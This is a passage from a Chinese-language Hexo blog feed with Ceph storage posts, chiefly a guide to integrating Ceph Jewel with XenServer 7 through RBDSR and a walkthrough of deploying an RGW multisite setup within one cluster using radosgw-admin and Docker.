<li><a href="http://www.xuxiaopang.com/2016/11/11/doc-ceph-table/">Ceph常用表格汇总</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph(J版)与XenServer7集成</title>
    <url>/2016/11/24/storage/ceph/jewel-xenserver7-integration/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul>
<li>XenServer7</li>
<li>Ceph Jewel</li>
<li><a href="https://github.com/zhoubofsy/RBDSR-1">RBDSR</a></li>
</ul>
<h1 id="集成原理"><a href="#集成原理" class="headerlink" title="集成原理"></a>集成原理</h1><p><img src="/images/ceph/rbdsr-xenserver7-integration.png" alt="rbdsr-xenserver7-integration"></p>
<p>应用层客户端i&#x2F;o通过XenServer将i&#x2F;o传递给fuse或nbd内核模块，nbd通过文件socket，将i&#x2F;o请求传递给rbd-nbd。rbd-nbd通过ceph-common(包括librbd和librados)将读写请求发送给Ceph集群。（fuse内部通信方式及协议目前不清楚，待后续调研清楚再更新）</p>
<ul>
<li><a href="https://zhoubofsy.github.io/2016/11/17/storage/ceph/rbd-nbd/">关于rbd-nbd原理分析</a></li>
</ul>
<h1 id="安装配置步骤"><a href="#安装配置步骤" class="headerlink" title="安装配置步骤"></a>安装配置步骤</h1><h2 id="依赖库安装"><a href="#依赖库安装" class="headerlink" title="依赖库安装"></a>依赖库安装</h2><h3 id="snappy-leveldb-gdisk-gperftools-libs-fuse-fuse-libs安装"><a href="#snappy-leveldb-gdisk-gperftools-libs-fuse-fuse-libs安装" class="headerlink" title="snappy leveldb gdisk gperftools-libs fuse fuse-libs安装"></a>snappy leveldb gdisk gperftools-libs fuse fuse-libs安装</h3><p>rpm列表：</p>
<ul>
<li>snappy-1.1.0-3.el7.x86_64.rpm</li>
<li>leveldb-1.12.0-11.el7.x86_64.rpm</li>
<li>gdisk-0.8.6-5.el7.x86_64.rpm</li>
<li>gperftools-libs-2.4-5.el7.x86_64.rpm</li>
<li>fuse-2.9.2-6.el7.x86_64.rpm</li>
<li>fuse-libs-2.9.2-6.el7.x86_64.rpm</li>
</ul>
<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y localinstall *.rpm</span><br></pre></td></tr></table></figure>
<h3 id="python-argparse-安装"><a href="#python-argparse-安装" class="headerlink" title="python-argparse 安装"></a>python-argparse 安装</h3><p>python-argparse依赖rpm列表：</p>
<ul>
<li>libunwind-1.1-5.el7.x86_64.rpm</li>
<li>python-backports-ssl_match_hostname-3.4.0.2-4.el7.noarch.rpm</li>
<li>python-backports-1.0-8.el7.x86_64.rpm</li>
<li>python-setuptools-0.9.8-4.el7.noarch.rpm</li>
</ul>
<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y localinstall *.rpm</span><br></pre></td></tr></table></figure>

<p>tar列表：<br><code>argparse-1.4.0.tar.gz</code><br>python-argparse安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzvf ./argparse-1.4.0.tar.gz</span><br><span class="line">cd argparse-1.4.0</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<h3 id="ceph-common-rbd-fuse-rbd-nbd安装"><a href="#ceph-common-rbd-fuse-rbd-nbd安装" class="headerlink" title="ceph-common rbd-fuse rbd-nbd安装"></a>ceph-common rbd-fuse rbd-nbd安装</h3><p>rpm列表：</p>
<ul>
<li>boost-iostreams-1.53.0-25.el7.x86_64.rpm</li>
<li>ceph-common-10.2.3-0.el7.x86_64.rpm</li>
<li>librados2-10.2.3-0.el7.x86_64.rpm</li>
<li>lttng-ust-2.4.1-1.el7.x86_64.rpm</li>
<li>python-rbd-10.2.3-0.el7.x86_64.rpm</li>
<li>rbd-fuse-10.2.3-0.el7.x86_64.rpm</li>
<li>rbd-nbd-10.2.3-0.el7.x86_64.rpm</li>
<li>python-requests-2.6.0-1.el7_1.noarch.rpm</li>
<li>python-cephfs-10.2.3-0.el7.x86_64.rpm</li>
<li>libradosstriper1-10.2.3-0.el7.x86_64.rpm</li>
<li>fcgi-2.4.0-25.el7.x86_64.rpm</li>
<li>boost-program-options-1.53.0-25.el7.x86_64.rpm</li>
<li>boost-random-1.53.0-25.el7.x86_64.rpm</li>
<li>libbabeltrace-1.2.4-3.el7.x86_64.rpm</li>
<li>librbd1-10.2.3-0.el7.x86_64.rpm</li>
<li>python-chardet-2.2.1-1.el7_1.noarch.rpm</li>
<li>python-six-1.9.0-2.el7.noarch.rpm</li>
<li>userspace-rcu-0.7.16-1.el7.x86_64.rpm</li>
<li>python-urllib3-1.10.2-2.el7_1.noarch.rpm</li>
<li>python-rados-10.2.3-0.el7.x86_64.rpm</li>
<li>librgw2-10.2.3-0.el7.x86_64.rpm</li>
<li>libcephfs1-10.2.3-0.el7.x86_64.rpm</li>
<li>boost-regex-1.53.0-25.el7.x86_64.rpm</li>
</ul>
<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y localinstall *.rpm</span><br></pre></td></tr></table></figure>

<h2 id="RBDSR安装"><a href="#RBDSR安装" class="headerlink" title="RBDSR安装"></a>RBDSR安装</h2><h3 id="获取RBDSR"><a href="#获取RBDSR" class="headerlink" title="获取RBDSR"></a>获取RBDSR</h3><p>可通过git获取或svn获取<br>Git事例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/zhoubofsy/RBDSR-1.git</span><br></pre></td></tr></table></figure>

<h3 id="安装RBDSR"><a href="#安装RBDSR" class="headerlink" title="安装RBDSR"></a>安装RBDSR</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./install</span><br></pre></td></tr></table></figure>

<h2 id="Ceph配置"><a href="#Ceph配置" class="headerlink" title="Ceph配置"></a>Ceph配置</h2><p>copy Ceph集群里的配置文件（&#x2F;etc&#x2F;ceph&#x2F;ceph.conf）和 Keyring文件（&#x2F;etc&#x2F;ceph&#x2F;ceph.client.admin.keyring）到XenServer节点的<code>/etc/ceph/</code>目录下<br>完成copy工作后，可通过<code>ceph -s</code>命令来确认ceph访问能力是否正常</p>
<h2 id="重启XAPI"><a href="#重启XAPI" class="headerlink" title="重启XAPI"></a>重启XAPI</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xe-toolstack-restart</span><br></pre></td></tr></table></figure>

<h2 id="主节点挂载"><a href="#主节点挂载" class="headerlink" title="主节点挂载"></a>主节点挂载</h2><p>*** 注：在XenServer Master节点上需要按下述步骤挂载Ceph存储，其他非Master节点只需要执行<code>4</code>、<code>5</code>步 ***</p>
<h3 id="1-在ceph集群上创建链接XenServer需要的存储池"><a href="#1-在ceph集群上创建链接XenServer需要的存储池" class="headerlink" title="1. 在ceph集群上创建链接XenServer需要的存储池"></a>1. 在ceph集群上创建链接XenServer需要的存储池</h3><p>首先使用<code>uuidgen</code>生成uuid，然后创建存储池，存储池命名规则为“RBD_XenStorage-”前缀加uuid的方式。<br>eg：<code>ceph osd pool create RBD_XenStorage-ffc44a2c-7de2-49e7-a621-8ecabdb357f4 128 128 replicated</code></p>
<h3 id="2-创建SR"><a href="#2-创建SR" class="headerlink" title="2. 创建SR"></a>2. 创建SR</h3><p>eg：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xe sr-introduce name-label=<span class="string">&quot;CEPH RBD Storage&quot;</span> <span class="built_in">type</span>=rbd uuid=ffc44a2c-7de2-49e7-a621-8ecabdb357f4 shared=<span class="literal">true</span> content-type=user</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>name-label</code>，可根据需要随意填写</li>
<li><code>uuid</code>，为创建ceph存储池时使用的uuid</li>
</ul>
<h3 id="3-获取host-uuid"><a href="#3-获取host-uuid" class="headerlink" title="3. 获取host uuid"></a>3. 获取host uuid</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xe host-list</span></span><br><span class="line">uuid ( RO)                : 267cb56e-983f-48fb-a50a-7bcb7bbbee85</span><br><span class="line">          name-label ( RW): xenserver-88</span><br><span class="line">              name-description ( RW): Default install</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uuid ( RO)                : 11e7e849-fd19-470e-9cb8-0c6c6781531f</span><br><span class="line">          name-label ( RW): xenserver90</span><br><span class="line">              name-description ( RW): Default install</span><br></pre></td></tr></table></figure>
<p>取本机的<code>uuid</code>做为host uuid</p>
<h3 id="4-创建PBD"><a href="#4-创建PBD" class="headerlink" title="4. 创建PBD"></a>4. 创建PBD</h3><p>使用<code>xe pbd-create</code>创建PBD，默认创建方式为rbd-nbd方式，若想以rbd-fuse方式创建PBD，需要在<code>rbd-mode</code>参数中指定fuse。创建成功则返回PBD uuid<br>rbd-nbd eg：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xe pbd-create sr-uuid=ffc44a2c-7de2-49e7-a621-8ecabdb357f4 host-uuid=11e7e849-fd19-470e-9cb8-0c6c6781531f</span></span><br><span class="line">c51c8000-ad5f-190e-5a6c-dc12cc8f8733</span><br></pre></td></tr></table></figure>

<p>rbd-fuse eg：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xe pbd-create sr-uuid=ffc44a2c-7de2-49e7-a621-8ecabdb357f4 host-uuid=11e7e849-fd19-470e-9cb8-0c6c6781531f device-config:rbd-mode=fuse</span></span><br><span class="line">c51c8000-ad5f-190e-5a6c-dc12cc8f8733</span><br></pre></td></tr></table></figure>

<h3 id="5-挂载PBD"><a href="#5-挂载PBD" class="headerlink" title="5. 挂载PBD"></a>5. 挂载PBD</h3><p>使用<code>xe pbd-plug</code>挂载PBD，需要指定PBD uuid。<br>eg：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xe pbd-plug uuid=c51c8000-ad5f-190e-5a6c-dc12cc8f8733</span></span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://github.com/rposudnevskiy/RBDSR">rposudnevskiy&#x2F;RBDSR</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>xenserver</tag>
        <tag>RBDSR</tag>
      </tags>
  </entry>
  <entry>
    <title>Journal Format</title>
    <url>/2019/03/11/storage/ceph/journal-format/</url>
    <content><![CDATA[<p>Todo…</p>
<h2 id="Journal存储格式"><a href="#Journal存储格式" class="headerlink" title="Journal存储格式"></a>Journal存储格式</h2><ol>
<li>header</li>
<li>Ring buffer</li>
</ol>
<p><img src="/images/ceph/journal_fmt_1.png" alt="journal_1"></p>
<h3 id="header格式"><a href="#header格式" class="headerlink" title="header格式"></a>header格式</h3><p><img src="/images/ceph/journal_fmt_header.png" alt="journal_1"></p>
<h2 id="Ring-buffer中entry-header格式"><a href="#Ring-buffer中entry-header格式" class="headerlink" title="Ring buffer中entry header格式"></a>Ring buffer中entry header格式</h2><p><img src="/images/ceph/journal_fmt_entry_header.png" alt="journal_1"></p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>librbd 架构分析</title>
    <url>/2017/01/22/storage/ceph/librbd-frame-analyse/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>ceph为统一存储，包括块存储（rbd）、文件存储（cephfs）、对象存储（radosgw）。正常我们所使用rbd cli使用的是库librbd来操作ceph的。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>ceph-jewel</p>
<h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p>librbd组织结构:<br><img src="/images/ceph/librbd.png" alt="librbd"></p>
<p>librbd架构:<br><img src="/images/ceph/librbd_frame.png" alt="librbd_frame"></p>
<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>*** todo ***</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><p>*** None ***</p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>librbd</tag>
      </tags>
  </entry>
  <entry>
    <title>Deploy multisite in 同一个集群</title>
    <url>/2019/10/14/storage/ceph/multi-site-in-a-cluster-md/</url>
    <content><![CDATA[<p>在一个Ceph集群里部署一个multisite RGW环境。有什么意义吗？没有，存属个人折腾。由于资源有限，所以只能在一个集群里委屈了。</p>
<p>限盐少许，直接开整。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>14.2.3 (0f776cf838a1ae3130b2b73dc26be9c95c6ccc39) nautilus (stable)</p>
<h1 id="RGW配置部署"><a href="#RGW配置部署" class="headerlink" title="RGW配置部署"></a>RGW配置部署</h1><h2 id="一个Site的部署"><a href="#一个Site的部署" class="headerlink" title="一个Site的部署"></a>一个Site的部署</h2><h3 id="修改-rgw-rootPool"><a href="#修改-rgw-rootPool" class="headerlink" title="修改.rgw.rootPool"></a>修改<code>.rgw.root</code>Pool</h3><p>修改<code>/etc/ceph/ceph.conf</code>中使用到<code>.rgw.root</code>pool的所有配置项，将其改为<code>exter.rgw.root</code>。<code>ceph.conf</code>中没有显示的配置，所以建议查找一下源代码中的配置<code>options.cc</code>。<br>之后再创建<code>realm</code>、<code>zonegroup</code>、<code>zone</code>等信息都会记录到<code>exter.rgw.root</code>中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rgw_zone_root_pool = exter.rgw.root</span><br><span class="line">rgw_region_root_pool = exter.rgw.root</span><br><span class="line">rgw_zonegroup_root_pool = exter.rgw.root</span><br><span class="line">rgw_realm_root_pool = exter.rgw.root</span><br><span class="line">rgw_period_root_pool = exter.rgw.root</span><br></pre></td></tr></table></figure>

<p>配置完成后，启动RGW。本人将RGW安装到了容器中，所以下面给出容器的启动命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net=host --name rgw -v /etc/ceph/:/etc/ceph/ -v /var/lib/ceph/:/var/lib/ceph/ ceph/daemon:latest-nautilus rgw</span><br></pre></td></tr></table></figure>
<p>运行后记得用<code>docker logs -f rgw</code>看一下rgw日志，确保其正常运行。</p>
<p>然后使用<code>ceph df</code>看一下，当前RGW创建了哪些Pools</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ceph <span class="built_in">df</span></span></span><br><span class="line">GLOBAL:</span><br><span class="line">    SIZE       AVAIL      RAW USED     %RAW USED</span><br><span class="line">    57 GiB     56 GiB      654 MiB          1.12</span><br><span class="line">POOLS:</span><br><span class="line">    NAME                        ID     USED        %USED     MAX AVAIL     OBJECTS</span><br><span class="line">    exter.rgw.root              18     1.2 KiB         0        27 GiB           4</span><br><span class="line">    default.rgw.control         19         0 B         0        27 GiB           8</span><br><span class="line">    default.rgw.meta            20         0 B         0        27 GiB           0</span><br><span class="line">    default.rgw.log             21         0 B         0        27 GiB          33</span><br></pre></td></tr></table></figure>

<h3 id="创建Realm"><a href="#创建Realm" class="headerlink" title="创建Realm"></a>创建Realm</h3><p>创建一个 realm ，若不创建，后续在设置自定义的zone为default时会报无效参数的错误。此问题，可以看<code>rgw_admin.cc</code>的源码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4438</span>     <span class="keyword">case</span> OPT_ZONE_DEFAULT:</span><br><span class="line"><span class="number">4439</span>       &#123;</span><br><span class="line"><span class="number">4440</span>         RGWZoneGroup <span class="title function_">zonegroup</span><span class="params">(zonegroup_id,zonegroup_name)</span>;</span><br><span class="line"><span class="number">4441</span>         <span class="type">int</span> ret = zonegroup.init(g_ceph_context, store-&gt;svc()-&gt;sysobj);</span><br><span class="line"><span class="number">4442</span>         <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">4443</span>           <span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;WARNING: failed to initialize zonegroup &quot;</span> &lt;&lt; zonegroup_name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="number">4444</span>         &#125;</span><br><span class="line"><span class="number">4445</span>         <span class="keyword">if</span> (zone_id.empty() &amp;&amp; zone_name.empty()) &#123;</span><br><span class="line"><span class="number">4446</span>           <span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;no zone name or id provided&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="number">4447</span>           <span class="keyword">return</span> EINVAL;</span><br><span class="line"><span class="number">4448</span>         &#125;</span><br><span class="line"><span class="number">4449</span>         RGWZoneParams <span class="title function_">zone</span><span class="params">(zone_id, zone_name)</span>;</span><br><span class="line"><span class="number">4450</span>         ret = zone.init(g_ceph_context, store-&gt;svc()-&gt;sysobj);</span><br><span class="line"><span class="number">4451</span>         <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">4452</span>           <span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;unable to initialize zone: &quot;</span> &lt;&lt; cpp_strerror(-ret) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="number">4453</span>           <span class="keyword">return</span> -ret;</span><br><span class="line"><span class="number">4454</span>         &#125;</span><br><span class="line"><span class="number">4455</span>         ret = zone.set_as_default();</span><br><span class="line"><span class="number">4456</span>         <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">4457</span>           <span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;failed to set zone as default: &quot;</span> &lt;&lt; cpp_strerror(-ret) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="number">4458</span>           <span class="keyword">return</span> -ret;</span><br><span class="line"><span class="number">4459</span>         &#125;</span><br><span class="line"><span class="number">4460</span>       &#125;</span><br><span class="line"><span class="number">4461</span>       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>在<code>failed to set zone as default</code>这个位置报错。</p>
<p>所以先配置一个realm吧</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# radosgw-admin realm list</span><br><span class="line">&#123;</span><br><span class="line">    &quot;default_info&quot;: &quot;&quot;,</span><br><span class="line">    &quot;realms&quot;: []</span><br><span class="line">&#125;</span><br><span class="line">[root@master ~]# radosgw-admin realm create --rgw-realm=default --default</span><br><span class="line">&#123;</span><br><span class="line">    &quot;id&quot;: &quot;f334e6c2-c2b4-4c04-b541-f64d96c10c07&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;default&quot;,</span><br><span class="line">    &quot;current_period&quot;: &quot;40775bd3-d592-46c0-98c7-33171915825b&quot;,</span><br><span class="line">    &quot;epoch&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="设置zonegroup的default-info"><a href="#设置zonegroup的default-info" class="headerlink" title="设置zonegroup的default info"></a>设置zonegroup的default info</h3><p>此时zonegroup的default info缺失了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# radosgw-admin zonegroup list</span><br><span class="line">&#123;</span><br><span class="line">    &quot;default_info&quot;: &quot;&quot;,</span><br><span class="line">    &quot;zonegroups&quot;: [</span><br><span class="line">        &quot;default&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">[root@master ~]# radosgw-admin zonegroup get</span><br><span class="line">failed to init zonegroup: (2) No such file or directory</span><br></pre></td></tr></table></figure>
<p>使用 <code>zonegroup default</code>重新设置default info</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# radosgw-admin zonegroup default --rgw-zonegroup=default</span><br><span class="line">[root@master ~]# radosgw-admin zonegroup list</span><br><span class="line">&#123;</span><br><span class="line">    &quot;default_info&quot;: &quot;57b6eaac-63da-42dd-b69d-f7e871ce74c9&quot;,</span><br><span class="line">    &quot;zonegroups&quot;: [</span><br><span class="line">        &quot;default&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="创建Zone"><a href="#创建Zone" class="headerlink" title="创建Zone"></a>创建Zone</h3><p>接下来，创建我们需要的zone, 并设置其为default</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# radosgw-admin zone list</span><br><span class="line">&#123;</span><br><span class="line">    &quot;default_info&quot;: &quot;&quot;,</span><br><span class="line">    &quot;zones&quot;: [</span><br><span class="line">        &quot;default&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">[root@master ~]# radosgw-admin zone create --rgw-zonegroup=default --rgw-zone=exter --master --default</span><br><span class="line">2019-10-14 19:00:50.322 7f3698ef7240  0 NOTICE: overriding master zone: f2a55476-fb68-4ea7-af97-251b91e94747</span><br><span class="line">&#123;</span><br><span class="line">    &quot;id&quot;: &quot;69234f1d-8f48-4431-b45f-912087431a47&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;exter&quot;,</span><br><span class="line">    &quot;domain_root&quot;: &quot;exter.rgw.meta:root&quot;,</span><br><span class="line">    &quot;control_pool&quot;: &quot;exter.rgw.control&quot;,</span><br><span class="line">    &quot;gc_pool&quot;: &quot;exter.rgw.log:gc&quot;,</span><br><span class="line">    &quot;lc_pool&quot;: &quot;exter.rgw.log:lc&quot;,</span><br><span class="line">    &quot;log_pool&quot;: &quot;exter.rgw.log&quot;,</span><br><span class="line">    &quot;intent_log_pool&quot;: &quot;exter.rgw.log:intent&quot;,</span><br><span class="line">    &quot;usage_log_pool&quot;: &quot;exter.rgw.log:usage&quot;,</span><br><span class="line">    &quot;reshard_pool&quot;: &quot;exter.rgw.log:reshard&quot;,</span><br><span class="line">    &quot;user_keys_pool&quot;: &quot;exter.rgw.meta:users.keys&quot;,</span><br><span class="line">    &quot;user_email_pool&quot;: &quot;exter.rgw.meta:users.email&quot;,</span><br><span class="line">    &quot;user_swift_pool&quot;: &quot;exter.rgw.meta:users.swift&quot;,</span><br><span class="line">    &quot;user_uid_pool&quot;: &quot;exter.rgw.meta:users.uid&quot;,</span><br><span class="line">    &quot;otp_pool&quot;: &quot;exter.rgw.otp&quot;,</span><br><span class="line">    &quot;system_key&quot;: &#123;</span><br><span class="line">        &quot;access_key&quot;: &quot;&quot;,</span><br><span class="line">        &quot;secret_key&quot;: &quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;placement_pools&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;key&quot;: &quot;default-placement&quot;,</span><br><span class="line">            &quot;val&quot;: &#123;</span><br><span class="line">                &quot;index_pool&quot;: &quot;exter.rgw.buckets.index&quot;,</span><br><span class="line">                &quot;data_pool&quot;: &quot;exter.rgw.buckets.data&quot;,</span><br><span class="line">                &quot;data_extra_pool&quot;: &quot;exter.rgw.buckets.non-ec&quot;,</span><br><span class="line">                &quot;index_type&quot;: 0,</span><br><span class="line">                &quot;compression&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;metadata_heap&quot;: &quot;&quot;,</span><br><span class="line">    &quot;realm_id&quot;: &quot;f334e6c2-c2b4-4c04-b541-f64d96c10c07&quot;</span><br><span class="line">&#125;</span><br><span class="line">[root@master ~]# radosgw-admin zone list</span><br><span class="line">&#123;</span><br><span class="line">    &quot;default_info&quot;: &quot;69234f1d-8f48-4431-b45f-912087431a47&quot;,</span><br><span class="line">    &quot;zones&quot;: [</span><br><span class="line">        &quot;exter&quot;,</span><br><span class="line">        &quot;default&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="删除default-zone"><a href="#删除default-zone" class="headerlink" title="删除default zone"></a>删除default zone</h3><p>现在你会发现有两个zone了，一个是我们新建的，另一个是default，这个default没用了，我们把它删掉。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">radosgw-admin zone delete --rgw-zone=default --default</span><br></pre></td></tr></table></figure>

<p>细心的朋友可能会发现radosgw-admin命令中没有<code>zone delete</code>这个命令啊，<code>-h</code>中显示的是<code>zone rm</code>啊。这是Bug，嘿嘿嘿～～～</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# radosgw-admin -h | grep -i zone | grep -i rm</span><br><span class="line">  zonegroup rm               remove a zone group info</span><br><span class="line">  zonegroup rm               remove a zone from a zonegroup</span><br><span class="line">  zonegroup placement rm     remove a placement target from a zonegroup</span><br><span class="line">  zone rm                    remove a zone</span><br><span class="line">  zone placement rm          remove a zone placement target</span><br><span class="line">   --tags-rm=&lt;list&gt;          list of tags to remove for zonegroup placement modify command</span><br><span class="line">   --sync-from-rm=[zone-name][,...]</span><br><span class="line">[root@master ~]# radosgw-admin -h | grep -i delete</span><br><span class="line">                               replica mdlog get/delete</span><br><span class="line">                               replica datalog get/delete</span><br><span class="line">                             (NOTE: required to delete a non-empty bucket)</span><br></pre></td></tr></table></figure>

<h3 id="重启RGW服务"><a href="#重启RGW服务" class="headerlink" title="重启RGW服务"></a>重启RGW服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# docker stop rgw</span><br><span class="line">[root@master ~]# docker start rgw</span><br></pre></td></tr></table></figure>

<h3 id="删除default相关的Pools"><a href="#删除default相关的Pools" class="headerlink" title="删除default相关的Pools"></a>删除default相关的Pools</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# ceph df</span><br><span class="line">GLOBAL:</span><br><span class="line">    SIZE       AVAIL      RAW USED     %RAW USED</span><br><span class="line">    57 GiB     56 GiB      657 MiB          1.13</span><br><span class="line">POOLS:</span><br><span class="line">    NAME                        ID     USED        %USED     MAX AVAIL     OBJECTS</span><br><span class="line">    exter.rgw.root              18     1.7 KiB         0        27 GiB          13</span><br><span class="line">    default.rgw.control         19         0 B         0        27 GiB           8</span><br><span class="line">    default.rgw.meta            20         0 B         0        27 GiB           0</span><br><span class="line">    default.rgw.log             21         0 B         0        27 GiB         175</span><br><span class="line">    exter.rgw.control           22         0 B         0        27 GiB           8</span><br><span class="line">    exter.rgw.meta              23         0 B         0        27 GiB           0</span><br><span class="line">    exter.rgw.log               24         0 B         0        27 GiB         159</span><br></pre></td></tr></table></figure>
<p>重启RGW服务后，发现多了三个Pool <code>exter.rgw.control</code>、<code>exter.rgw.meta</code>、<code>exter.rgw.log</code>。而default开头的pool就没用了，可以删除了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# ceph osd pool rm default.rgw.control default.rgw.control --yes-i-really-really-mean-it</span><br><span class="line">pool &#x27;default.rgw.control&#x27; removed</span><br><span class="line">[root@master ~]# ceph osd pool rm default.rgw.meta default.rgw.meta --yes-i-really-really-mean-it</span><br><span class="line">pool &#x27;default.rgw.meta&#x27; removed</span><br><span class="line">[root@master ~]# ceph osd pool rm default.rgw.log default.rgw.log --yes-i-really-really-mean-it</span><br><span class="line">pool &#x27;default.rgw.log&#x27; removed</span><br></pre></td></tr></table></figure>

<h2 id="另一个Site的部署"><a href="#另一个Site的部署" class="headerlink" title="另一个Site的部署"></a>另一个Site的部署</h2><p>*** 参考<code>一个Site的部署方法</code>吧 ***</p>
<h2 id="Zone之间的数据同步"><a href="#Zone之间的数据同步" class="headerlink" title="Zone之间的数据同步"></a>Zone之间的数据同步</h2><p>如果上述的部署方法你都清楚了，相信配置一个Zone之间同步数据的Multisite应该不在话下了。下面说说数据同步的几点注意事项吧。</p>
<ol>
<li>数据同步必须是在不同zone之间进行的，但zone必须在同一zonegroup之下。</li>
<li>每一个zonegroup内都有一个master zone；一个realm中有多个zonegroup，但master zonegroup只有一个，realm命名空间全局唯一；</li>
<li>数据分为 period 数据、user数据、bucket数据、object数据。<br> period数据需要用户手动配置，不能自动同步；<br> user数据只能从master zone写入，然后非master zone同步；<br> bucket数据可以从任意一个zone写入，但最后都会转发给master zone，待master 写入成功后，其它zone同步数据，若master失败，其它zone亦失败；<br> object数据可以从任意一个zone写入，若master zone写入失败，不影响其它zone写入情况。</li>
<li>每个zone的<code>endpoints</code>需要配置，否则zone之间无法正常访问</li>
<li>zone上配置的<code>access key</code>和<code>secret</code>要与master zone一致</li>
</ol>
<p>补个图吧：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">                                          +--- master zone</span><br><span class="line">                                          |</span><br><span class="line">                                          +--- secondary zone 1</span><br><span class="line">                                          |</span><br><span class="line">         +---------- master zonegroup ----+--- ......</span><br><span class="line">         |                                |</span><br><span class="line">         |                                +--- secondary zone n</span><br><span class="line">         |</span><br><span class="line">realm ---+---------- secondary zonegroup 1 --+--- master zone</span><br><span class="line">         |                                   |</span><br><span class="line">         |                                   +--- secondary zone 1</span><br><span class="line">         +---------- ......                  |</span><br><span class="line">         |                                   +--- ......</span><br><span class="line">         |</span><br><span class="line">         +---------- secondary zonegropu n</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>OSD Journal 运维操作</title>
